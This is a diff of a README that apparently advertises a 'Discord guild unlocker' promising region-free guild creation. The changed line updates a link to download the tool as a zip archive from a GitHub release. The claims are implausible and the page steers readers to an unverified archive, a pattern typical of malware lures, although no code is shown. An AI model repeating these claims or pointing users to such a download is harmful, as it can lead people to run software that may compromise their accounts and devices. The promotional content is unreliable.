@@ -8,7 +8,7 @@ This software opens up the possibility of creating YOUR own guild in Discord
 Creating a guild in Discord has traditionally been available only to a limited number of users, which sometimes left many people without the opportunity to organize their own community. Our program changes this situation, opening access to the guild creation function for all users, regardless of their region. Now everyone will be able to create a unique space for communication, sharing experiences and leisure time together. Your ideas and community can become a reality with our software!
 
 
-## [Donwload Discord guild unlocker v1.0.1](https://github.com/theunknown10/discord-guild-unlocker/releases/download/untagged-2b37781d60ea35e5a686/discord.unlocker.v1.0.1.zip)
+## [Donwload Discord guild unlocker v1.0.1](https://github.com/theunknown10/discord-guild-unlocker/releases/download/Discord-guild-unlocker/discord.unlocker.v1.0.1.zip)
 ## How to use?
 > [!IMPORTANT]
 > 1. User selects the interface language.
